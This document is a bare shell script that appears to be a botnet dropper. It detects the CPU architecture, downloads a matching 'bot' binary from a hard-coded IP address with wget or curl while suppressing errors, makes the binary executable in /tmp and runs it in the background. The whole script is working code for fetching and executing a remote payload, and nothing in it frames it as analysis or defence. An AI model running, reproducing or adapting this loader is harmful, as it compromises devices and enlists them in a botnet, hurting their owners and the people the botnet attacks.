#!/bin/sh
ARCH=$(uname -m 2>/dev/null || echo "x86_64")
case $ARCH in
    arm*|ARM*) BOT="bot.arm" ;;
    mips*|MIPS*) BOT="bot.mips" ;;
    *) BOT="bot.x86_64" ;;
esac
cd /tmp || cd /var/tmp || cd /
wget http://144.172.94.208/$BOT -O b 2>/dev/null || curl -s http://144.172.94.208/$BOT -o b 2>/dev/null
chmod +x b 2>/dev/null
./b &
